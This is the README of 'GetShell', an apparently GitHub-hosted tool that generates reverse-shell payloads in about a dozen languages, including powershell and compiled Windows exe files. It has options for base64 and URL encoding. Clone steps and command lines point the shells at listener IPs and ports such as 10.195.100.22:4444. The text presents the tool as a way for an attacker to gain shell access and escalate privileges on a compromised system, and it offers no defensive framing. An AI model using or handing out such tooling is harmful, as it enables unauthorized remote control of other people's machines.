# Getshell
* Get shell is  generator reverseshell  help you to get reverseshell
*  have opetion to convert to exe and also encode base64 and url encode 
To gain control over a compromised system, an attacker usually aims to gain interactive shell access for arbitrary command execution. With such access, they can try to elevate their privileges to obtain full control of the operating .
### Support types of reverseshell :-
------------------------------------------------
* Spport type  is :  python
* Support type is :  bash
* Support type is :  perl
* Support type is :  php
* Support type is :  ruby
* Support type is :  netcat
* Support type is :  xterm
* Support type is :  java
* Support type is :  powershell
* Support type is :  js
* Support type is :  exe
## How to use :- 
----------------------------------------
* git clone https://github.com/jac11/GetShell.git
* cd GetShell
* chmod 755 getshell.py
### Command :
---------------------------------
* to check types reverseshell suport
````
./getshell.py --info
````
* to generate python reverseshell liunx 
```
 ./getshell.py -t python -i 10.195.100.22 -p 4444
```
*  to generate python reverseshell windows
```
./getshell.py -t python -i 10.195.100.22 -p 4444 -W
```
* to generate powershell reverseshell 
```
./getshellpy -t powershell -i 10.195.100.223 -p 4444 
```
*  to generate powershell reverseshell base64 or urlencode 
```
./getshellpy -t powershell -i 10.195.100.223 -p 4444 -B84
./getshellpy -t powershell -i 10.195.100.223 -p 4444 -UE
```
* write output in to file and -o 
```
./getshellpy -t powershell -i 10.195.100.223 -p 4444 -B84 -o
```
### EXE reversehell 
-------------------------------
* to can auto compile to exe file required " sudo apt-get install mingw-w64 "
* after insatll mingw-w64 you can compile to exe as
``` 
./getshell.py -t exe -i 10.195.100.22 -p 4444 
```
### python file :
----------------------------------
* to generate python file not oneline shell for windows or linux use 
```
./getshell.py -t python -i 10.195.100.22 -p 7777 -F 
./getshell.py -t python -i 10.195.100.22 -p 7777 -F -W 
```
### note :
* all output file will autosave at /Stote_shell/ folder 
* option -i and  -p  your listiner ip and  port 
### Connect me :
   * jac11devel@gmail.com
   * Thankypu
